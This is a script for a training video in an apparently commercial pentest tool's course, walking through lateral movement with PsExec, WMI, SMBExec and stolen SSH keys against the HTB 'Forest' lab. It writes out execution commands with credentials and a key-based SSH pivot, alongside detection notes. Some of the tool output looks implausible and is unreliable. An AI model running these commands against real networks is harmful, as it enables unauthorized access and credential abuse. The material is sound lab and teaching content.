# VIDEO 48: Lateral Movement
### PsExec, WMI, SMB Execution & SSH Key Abuse
**Suggested length:** 16–18 minutes
**License Tier:** Enterprise
**Certification Relevance:** OSCP: Post-Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 8 title card "Post-Exploitation and Privilege Escalation"]**

> "Welcome to Video 48 — Lateral Movement. This is where we take our single foothold and expand it across the network. In the previous videos, we established sessions (see Video 45: Session Management), harvested credentials (see Video 46: Credential Harvesting), and installed persistence (see Video 47: Persistence Techniques). Now we'll use those harvested credentials to move from our initial compromised host to other systems in the domain — PsExec for full interactive sessions, WMI for stealthy command execution, SMB for file-based movement, and SSH key abuse for Linux pivot points."

**[Screen: Warning banner — red background with white text: "⚠️ AUTHORIZED TESTING ONLY — ISOLATED LAB ENVIRONMENT — LATERAL MOVEMENT WITHOUT AUTHORIZATION IS A CRIMINAL OFFENSE"]**

> "Mandatory safety and ethics statement. Lateral movement means accessing additional computer systems using credentials or access obtained from a compromised host. In the real world, this is how ransomware operators move through corporate networks. In penetration testing, lateral movement is only performed when explicitly authorized in your rules of engagement, and each new system accessed must fall within the agreed scope. Accessing systems outside your scope — even if credentials work — is unauthorized access. Today we're demonstrating against HTB 'Forest', an isolated Active Directory lab machine. Every action we take is contained within that lab environment."

**[Screen: Network diagram showing lateral movement concept — Initial Foothold → Credential Harvest → Move to DC/File Server/DB Server]**

> "Lateral movement follows a pattern. You compromise one system, harvest credentials from it — password hashes, cleartext passwords, Kerberos tickets, SSH keys — and then use those credentials to authenticate to other systems. The goal is usually reaching high-value targets: domain controllers, database servers, file servers with sensitive data, or systems with higher privilege levels. Huginn's Post-Exploitation Framework automates this workflow through its lateral_movement function, supporting PsExec, WMI execution, SMB execution, and SSH-based movement."

---

## SECTION 1: Lateral Movement Theory (1:45 – 3:15)

**[Screen: Diagram showing the four lateral movement protocols — PsExec (SMB + Service), WMI (DCOM/135), SMBExec (SMB + Share), SSH (port 22)]**

> "Each lateral movement technique uses a different protocol and leaves different forensic artifacts. PsExec creates a Windows service on the target, uploads a binary through SMB, starts the service, and returns an interactive shell. It's reliable but noisy — service creation events, SMB file writes, and new process execution all generate logs. WMI execution uses the Windows Management Instrumentation service over DCOM — port 135 — to execute commands remotely. It doesn't drop files or create services, making it stealthier, but output retrieval is indirect. SMB execution writes commands to a share and uses a created service for execution, similar to PsExec but with different implementation details. SSH lateral movement uses stolen SSH keys or harvested credentials to establish direct shell access to Linux systems."

**[Screen: Comparison table — Lateral Movement methods with columns: Method, Protocol, Ports, Artifacts, Stealth Level, Shell Type]**

> "Here's the comparison matrix for our four methods."

| Method | Protocol | Ports | Artifacts | Stealth | Shell Type |
|--------|----------|-------|-----------|---------|------------|
| PsExec | SMB + SVC | 445, 139 | Service creation, file write | Low | Interactive |
| WMI Exec | DCOM/WMI | 135, dynamic | WMI event logs | Medium | Semi-interactive |
| SMB Exec | SMB | 445 | Share write, service creation | Low-Medium | Semi-interactive |
| SSH | SSH | 22 | Auth logs | Medium-High | Interactive |

> "The choice depends on your objectives and the target's monitoring posture. If you need a full interactive shell and don't care about detection, PsExec is the reliable workhorse. If stealth matters, WMI gives you command execution without file drops. SSH is preferred for Linux targets or when you've found SSH private keys during credential harvesting."

---

## SECTION 2: Lab Setup — HTB Forest (3:15 – 4:45)

**[Screen: HTB dashboard — "Forest" machine selected (10.10.10.161), Easy difficulty, Windows Server]**

> "Our target is HTB Forest — an Easy-rated Windows Active Directory machine at 10.10.10.161. Forest is a domain controller for the htb.local domain, running Windows Server 2016 with Active Directory Domain Services. It has WinRM on port 5985, LDAP on 389, Kerberos on 88, SMB on 445, and RPC on 135 — a complete AD environment perfect for demonstrating lateral movement techniques."

```bash
# Lab Setup — HTB Forest
# ═══════════════════════
#
# Platform: Hack The Box
# Machine: Forest (10.10.10.161)
# OS: Windows Server 2016
# Domain: htb.local
# Difficulty: Easy
#
# Services:
# ├── WinRM (5985) — Windows Remote Management
# ├── LDAP (389)   — Active Directory
# ├── Kerberos (88) — Authentication
# ├── SMB (445)    — File sharing / PsExec target
# ├── RPC (135)    — WMI execution endpoint
# └── DNS (53)     — Domain resolution
#
# Connect via HTB VPN:
# openvpn lab.ovpn
#
# Verify: ping 10.10.10.161
```

**[Screen: Huginn Session Manager showing established session on Forest — session ID, user context showing domain user 'svc-alfresco']**

> "I've already established initial access as the service account 'svc-alfresco' on the Forest domain controller. This account was discovered through AS-REP Roasting — a technique we'll cover in detail in the next video (see Video 49: Active Directory Enumeration). For now, we have a low-privilege domain account with credentials, and we want to demonstrate how Huginn uses those credentials to move laterally to other services on this host and potentially other hosts in the domain."

---

## SECTION 3: PsExec Lateral Movement (4:45 – 7:45)

**[Screen: Huginn Post-Exploitation → Lateral Movement panel — "PsExec" method selected, target host and credentials fields visible]**

> "PsExec is the gold standard for Windows lateral movement. Originally a Sysinternals administrative tool, PsExec uses SMB to connect to the target's ADMIN$ or C$ share, uploads a service executable, creates and starts a Windows service, and returns an interactive command shell running as SYSTEM. Impacket's psexec.py replicates this behavior without needing the original Microsoft binary."

**[Screen: Huginn PsExec configuration — Target: 10.10.10.161, Username: svc-alfresco, Domain: htb.local, credentials populated from harvested store]**

> "In Huginn, select PsExec from the lateral movement methods. The target host is 10.10.10.161 — in a real multi-host scenario, this would be a different machine, but we're demonstrating the protocol mechanics against Forest itself. Credentials come from our harvested credential store — username 'svc-alfresco', domain 'htb.local', and the password we cracked earlier. Huginn pre-populates credentials from the Credential Harvesting module, so you don't need to re-enter them."

```bash
# PsExec Lateral Movement
# ═══════════════════════
# Target: 10.10.10.161 (FOREST.htb.local)
# Method: PsExec (SMB service creation)
# Credentials: htb.local\svc-alfresco
#
# Huginn lateral_movement() execution:
# [*] Connecting to 10.10.10.161 via SMB (port 445)...
# [*] Authenticating as htb.local\svc-alfresco...
# [+] Authentication successful
# [*] Uploading service binary to ADMIN$ share...
# [*] Creating service 'RemoteSvc' on target...
# [*] Starting service...
# [+] Service started — shell established
#
# New session established:
# Session ID: SES-f8a2b4c7
# Type: lateral_movement (psexec)
# Target: 10.10.10.161
# User: NT AUTHORITY\SYSTEM
# Shell: Interactive CMD
```

**[Screen: Huginn showing new session in Session Manager — two sessions now visible, original and PsExec session]**

> "PsExec gives us a SYSTEM-level shell. Notice the privilege escalation — we authenticated as svc-alfresco but the shell runs as NT AUTHORITY SYSTEM because the service executes under the LocalSystem account. This is a key advantage of PsExec over other methods. The Session Manager now shows two active sessions — our original foothold and the new PsExec session."

**[Screen: Huginn command execution in PsExec session — running whoami, ipconfig, net user commands]**

> "Let's verify our access. Whoami confirms NT AUTHORITY SYSTEM. We have full control of this machine through the PsExec session. In a multi-host environment, this is how you'd pivot from a workstation to a server, or from one server to the domain controller."

```bash
# PsExec session commands
# ───────────────────────
# C:\Windows\System32> whoami
# nt authority\system
#
# C:\Windows\System32> hostname
# FOREST
#
# C:\Windows\System32> net user /domain
# [... domain users listed ...]
#
# C:\Windows\System32> ipconfig
# IPv4 Address: 10.10.10.161
# Subnet Mask: 255.255.255.0
```

---

## SECTION 4: WMI Execution (7:45 – 10:15)

**[Screen: Huginn Post-Exploitation → Lateral Movement — "WMI Exec" method selected]**

> "WMI execution is the stealthier alternative to PsExec. Windows Management Instrumentation is a legitimate management framework — administrators use it daily for remote system management, software inventory, and health monitoring. WMI-based lateral movement doesn't write files to disk or create visible services. Commands execute through the WMI provider and output can be retrieved through various methods."

**[Screen: Huginn WMI configuration — target, credentials, command to execute]**

> "The implementation uses DCOM — Distributed Component Object Model — on port 135 to connect to the WMI service. Impacket's wmiexec.py establishes a DCOM connection, creates a Win32_Process instance, and calls the Create method to execute commands. Output retrieval typically uses a temporary file written to a writable SMB share, then read back and deleted."

```bash
# WMI Execution Lateral Movement
# ═══════════════════════════════
# Target: 10.10.10.161 (FOREST.htb.local)
# Method: WMI Exec (DCOM/Win32_Process)
# Credentials: htb.local\svc-alfresco
#
# Huginn lateral_movement() execution:
# [*] Connecting to 10.10.10.161 via DCOM (port 135)...
# [*] Binding to WMI interface...
# [+] DCOM connection established
# [*] Creating Win32_Process for command execution...
# [*] Output retrieval via SMB share...
#
# wmiexec.py htb.local/svc-alfresco:password@10.10.10.161
#
# [+] WMI session established
# Session ID: SES-c3d9e1f5
# Type: lateral_movement (wmiexec)
# Target: 10.10.10.161
# User: htb.local\svc-alfresco
# Shell: Semi-interactive (WMI)
```

**[Screen: Huginn showing WMI session — command input field, output panel showing results]**

> "The WMI session is semi-interactive. You submit commands and get output back, but there's no persistent shell process on the target. Each command creates a new Win32_Process, executes, writes output to a temp file, and Huginn retrieves it. This means less forensic artifacts — no persistent process, no service, no uploaded binary. The tradeoff is speed — each command has the overhead of process creation and output retrieval."

```bash
# WMI session — command execution
# ────────────────────────────────
# Cmd> whoami
# htb\svc-alfresco
#
# Cmd> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# OS Name:    Microsoft Windows Server 2016 Standard
# OS Version: 10.0.14393 N/A Build 14393
#
# Cmd> net group "Domain Admins" /domain
# Members: Administrator
#
# [*] Note: Running as svc-alfresco (domain user context)
# [*] Unlike PsExec, WMI doesn't elevate to SYSTEM
```

**[Screen: Side-by-side comparison — PsExec artifacts vs WMI artifacts in Event Viewer]**

> "The forensic difference is significant. PsExec generates Event ID 7045 — a new service installed — plus 4697 for service installation in the security log, SMB file writes, and a running process. WMI generates Event ID 4688 for process creation and WMI-Activity operational logs. For a defender, PsExec is a red flag visible from across the room. WMI blends with legitimate management traffic. Choose accordingly."

---

## SECTION 5: SMB-Based Lateral Movement (10:15 – 12:30)

**[Screen: Huginn Post-Exploitation → Lateral Movement — "SMB Exec" method selected]**

> "SMB execution is a variant that sits between PsExec and WMI in terms of stealth and capability. Like PsExec, it uses the SMB protocol to authenticate and execute commands. The difference is implementation details — smbexec uses a temporary service that reads commands from a batch file on a writable share rather than uploading a full binary. This results in slightly different artifacts."

```bash
# SMB Execution Lateral Movement
# ═══════════════════════════════
# Target: 10.10.10.161 (FOREST.htb.local)
# Method: SMB Exec
# Credentials: htb.local\svc-alfresco
#
# Huginn lateral_movement() execution:
# [*] Connecting to 10.10.10.161 via SMB (port 445)...
# [*] Authenticating as htb.local\svc-alfresco...
# [+] Authentication successful
# [*] Using share-based command execution...
# [*] Creating service for command dispatch...
#
# smbexec.py htb.local/svc-alfresco:password@10.10.10.161
#
# [+] SMB exec session established
# Session ID: SES-a7b2c8d4
# Type: lateral_movement (smbexec)
# Target: 10.10.10.161
# Shell: Semi-interactive (SMB)
```

**[Screen: Huginn showing SMB share enumeration on target — listing accessible shares and permissions]**

> "Before SMB execution, Huginn's lateral movement analysis checks which shares are accessible with your credentials. The ADMIN$ and C$ shares require administrative access. IPC$ is usually accessible for authenticated users. Custom shares may provide write access for command staging. This reconnaissance step determines which SMB execution variant will work with your privilege level."

```bash
# SMB Share Access Check
# ──────────────────────
# \\10.10.10.161\ADMIN$   — Access: READ/WRITE (admin required)
# \\10.10.10.161\C$       — Access: READ/WRITE (admin required)
# \\10.10.10.161\IPC$     — Access: READ (authenticated users)
# \\10.10.10.161\NETLOGON — Access: READ
# \\10.10.10.161\SYSVOL   — Access: READ
#
# [*] ADMIN$ access determines PsExec viability
# [*] Writable shares enable file staging for SMB exec
```

**[Screen: Huginn Lateral Movement comparison panel — showing all three Windows methods side-by-side with current session status]**

> "At this point we have three parallel lateral movement sessions — PsExec running as SYSTEM, WMI running as our domain user, and SMB exec. In a real engagement targeting multiple hosts, you'd choose the appropriate method for each target based on your privilege level and stealth requirements. Huginn's session manager tracks them all — you switch between sessions with a click."

---

## SECTION 6: SSH Key Abuse and Linux Lateral Movement (12:30 – 14:45)

**[Screen: Huginn Post-Exploitation → Lateral Movement — "SSH" method selected, SSH Lateral Movement module]**

> "SSH lateral movement targets Linux and Unix systems in the network. During credential harvesting, you may find SSH private keys on compromised hosts — in user home directories, in configuration files, or in backup locations. These keys provide passwordless access to any system that trusts them. Huginn's SSHLateralMovement module analyzes the compromised host for lateral opportunities and automates the pivot."

**[Screen: Huginn SSHLateralMovement analysis results — showing discovered SSH keys, known_hosts entries, and reachable targets]**

> "The SSHLateralMovement module performs five analysis steps automatically. First, it searches for SSH private keys on the compromised host. Second, it reads the known_hosts file to identify systems this host has connected to previously. Third, it scans the local network for reachable SSH services. Fourth, it checks for network shares that might contain credentials. Fifth, it evaluates sudo privileges that could grant access to root-owned SSH keys."

```bash
# SSH Lateral Movement Analysis
# ═════════════════════════════
# Huginn SSHLateralMovement.analyze_lateral_opportunities()
#
# [*] Analyzing SSH keys on compromised host...
#     Found: /home/user/.ssh/id_rsa (RSA 2048-bit, no passphrase)
#     Found: /home/user/.ssh/id_ed25519 (Ed25519, passphrase protected)
#
# [*] Analyzing known_hosts...
#     Target: 10.10.10.50 (previously connected)
#     Target: 10.10.10.75 (previously connected)
#     Target: 192.168.1.100 (internal network)
#
# [*] Scanning network for SSH services...
#     10.10.10.50:22  — OpenSSH 7.6p1 Ubuntu
#     10.10.10.75:22  — OpenSSH 8.2p1 Ubuntu
#     10.10.10.161:22 — OpenSSH 7.4 (protocol 2.0)
#
# [*] Lateral Risk Score: 78/100 (HIGH)
# [*] Recommendations:
#     - Try id_rsa against known_hosts targets
#     - Attempt SSH to 10.10.10.50 as current user
#     - Check if passphrase-protected key can be cracked
```

**[Screen: Huginn executing SSH lateral movement — connecting with discovered key to known_hosts target]**

> "With an unprotected private key and known target hosts, lateral movement is straightforward. Huginn uses the discovered key to attempt SSH connections to each known_hosts entry. If the target system has the corresponding public key in its authorized_keys, we get immediate shell access without any password. This is why SSH key management is so critical in enterprise environments — a single compromised host with shared keys can provide access to every system in the infrastructure."

```bash
# SSH Key-Based Lateral Movement
# ──────────────────────────────
# [*] Attempting SSH with discovered key...
# [*] Key: /home/user/.ssh/id_rsa
# [*] Target: 10.10.10.50 (from known_hosts)
# [*] User: user (same username)
#
# ssh -i /home/user/.ssh/id_rsa user@10.10.10.50
#
# [+] SSH authentication successful!
# [+] New session established
# Session ID: SES-e9f1a2b6
# Type: lateral_movement (ssh)
# Target: 10.10.10.50
# User: user
# Shell: Interactive SSH
#
# $ whoami
# user
# $ hostname
# webserver-01
```

**[Screen: Huginn network graph showing lateral movement path — Initial Host → Forest (PsExec) → Linux Server (SSH)]**

> "Huginn builds a visual graph of your lateral movement path. Starting from the initial compromise, each hop is tracked with the method used, credentials applied, and access level achieved. This becomes invaluable for reporting — showing the client exactly how an attacker could traverse their network from a single compromised account."

---

## SECTION 7: Lateral Movement Strategy and Detection (14:45 – 16:30)

**[Screen: Huginn Lateral Movement summary panel — all sessions listed with methods, access levels, and timestamps]**

> "Let's discuss strategy. In a real engagement, you don't use every lateral movement technique on every host. You choose based on three factors: your current privilege level, the target's monitoring capability, and your operational objective. High-value targets with strong monitoring get WMI — it's stealthier. Standard workstations where speed matters get PsExec. Linux servers with discovered SSH keys get SSH pivots."

**[Screen: Detection matrix — showing which security tools detect which lateral movement methods]**

> "From the defensive perspective — and this context matters for your pentest reports — each method has known detection signatures. PsExec triggers service creation alerts, endpoint detection rules for psexec.exe or its service name, and SMB lateral movement indicators. WMI triggers DCOM connection alerts and process creation from WmiPrvSE.exe. SSH triggers auth.log entries and potentially alerts on new key-based authentications. Understanding detection helps you advise clients on which monitoring gaps exist."

```bash
# Lateral Movement Session Summary
# ═════════════════════════════════
#
# Active Sessions After Lateral Movement:
# ┌────────────────┬───────────────┬──────────┬──────────────────┬────────────┐
# │ Session ID     │ Target        │ Method   │ User             │ Privilege  │
# ├────────────────┼───────────────┼──────────┼──────────────────┼────────────┤
# │ SES-original   │ 10.10.10.161  │ Initial  │ svc-alfresco     │ User       │
# │ SES-f8a2b4c7   │ 10.10.10.161  │ PsExec   │ NT AUTH\SYSTEM   │ SYSTEM     │
# │ SES-c3d9e1f5   │ 10.10.10.161  │ WMI Exec │ svc-alfresco     │ User       │
# │ SES-a7b2c8d4   │ 10.10.10.161  │ SMB Exec │ svc-alfresco     │ User       │
# │ SES-e9f1a2b6   │ 10.10.10.50   │ SSH      │ user             │ User       │
# └────────────────┴───────────────┴──────────┴──────────────────┴────────────┘
#
# [*] Total sessions: 5
# [*] Unique hosts accessed: 2
# [*] Highest privilege: SYSTEM (via PsExec)
```

**[Screen: Huginn report integration — lateral movement path diagram auto-generated for findings report]**

> "Everything we've done today feeds into your engagement report. Huginn auto-generates the lateral movement path diagram, documents which credentials enabled each hop, and maps the attack chain from initial compromise through full domain access. This tells the client's story — here's how one compromised service account led to SYSTEM on the domain controller."

---

## OUTRO (16:30 – end)

**[Screen: Summary card — PsExec (interactive SYSTEM shell), WMI (stealthy command execution), SMB Exec (share-based execution), SSH (key-based Linux pivots)]**

> "That's lateral movement in Huginn. PsExec for reliable interactive SYSTEM shells, WMI execution for stealthy command execution without file drops, SMB exec for share-based pivoting, and SSH key abuse for Linux lateral movement. Each method has its place in your toolkit — the key is matching the technique to your objective and the target's detection posture."

**[Screen: Ethics reminder — "Stay Within Scope. Document Every Hop. Clean Up All Sessions."]**

> "Critical reminder — every system you access must be within your authorized scope. Document every lateral movement hop with timestamps, credentials used, and access achieved. Clean up all sessions at engagement close. In the next video, we'll dive into Active Directory enumeration — mapping domain trusts, finding Kerberoastable accounts, and identifying privilege escalation paths through AD (see Video 49: Active Directory Enumeration). That's where lateral movement and AD knowledge combine for full domain compromise."

**[Screen: Huginn logo with "Enterprise Tier — Post-Exploitation Framework" and certification badges: OSCP Post-Exploitation, CEH System Hacking]**

> "This is an Enterprise tier feature. Lateral movement maps to the OSCP Post-Exploitation domain and the CEH System Hacking domain. For practice, HTB Forest is ideal for Windows AD lateral movement, and HTB machines like 'Monteverde' and 'Resolute' provide additional AD environments. See you in Video 49."

---

## License Tier Reference

| Feature | Required Tier |
|---------|---------------|
| PsExec Lateral Movement | Enterprise |
| WMI Execution | Enterprise |
| SMB-Based Execution | Enterprise |
| SSH Key Lateral Movement | Enterprise |
| Lateral Movement Analysis | Enterprise |
| Network Path Visualization | Enterprise |
| Multi-Session Management | Enterprise |
| Report Integration | Enterprise |
